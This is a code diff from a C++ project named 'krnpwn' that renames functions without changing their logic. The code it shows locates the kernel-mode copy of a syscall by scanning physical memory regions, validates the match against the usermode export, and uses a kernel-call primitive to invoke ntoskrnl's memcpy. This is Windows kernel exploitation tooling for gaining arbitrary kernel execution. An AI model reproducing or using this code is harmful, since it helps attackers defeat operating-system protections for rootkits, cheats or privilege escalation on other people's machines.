@@ -38,11 +38,11 @@ namespace krnpwn
         log_info( SYSCALL_FUNC, "page offset:", std::hex, page_offset, "\n" );
 
         // loop through the physical memory regions we found from the registry
-        for( auto region : regions )
+        for( const auto region : regions )
         {
             log_info( "searching region", std::hex, region.address, "->", std::hex, ( region.address + region.size ) );
 
-            ksyscall_address = find_ksyscall( region.address, region.size );
+            ksyscall_address = find_syscall_km( region.address, region.size );
 
             if( ksyscall_address != 0 )
                 break;
@@ -61,7 +61,7 @@ namespace krnpwn
         return initalised;
     }
 
-    uint64_t krnpwn::find_ksyscall( uint64_t address, uint64_t size )
+    uint64_t krnpwn::find_syscall_km( uint64_t address, uint64_t size )
     {
         uint64_t phys_dump_size = ( size < PAGE_4MB ) ? size : PAGE_4MB;
 
@@ -84,7 +84,7 @@ namespace krnpwn
                     log_dbg( "potential match:", std::hex, ( address + offset + page + page_offset ) );
 
                     // if they match we need to validate that it is the correct function
-                    if( valid_ksyscall( address + offset + page + page_offset ) )
+                    if( valid_syscall_km( address + offset + page + page_offset ) )
                     {
                         // return the absolute physical address of the function
                         return ( uint64_t )( address + offset + page + page_offset );
@@ -102,7 +102,7 @@ namespace krnpwn
         return 0;
     }
 
-    bool krnpwn::valid_ksyscall( uint64_t address )
+    bool krnpwn::valid_syscall_km( uint64_t address )
     {
         // get the address of the usermode syscall
         static const auto proc = native::find_export( LoadLibraryA( syscall_mod ), SYSCALL_FUNC );
@@ -136,10 +136,10 @@ namespace krnpwn
         return result == 0;
     }
 
-    bool krnpwn::kmemcpy( void* dst, void* src, size_t size )
+    bool krnpwn::memcpy_km( void* dst, void* src, size_t size )
     {
         static const auto func = native::find_kernel_export( "ntoskrnl.exe", "memcpy" );
 
-        return kcall< decltype( &memcpy ) >( func, dst, src, size );
+        return call_km< decltype( &memcpy ) >( func, dst, src, size );
     }
 }
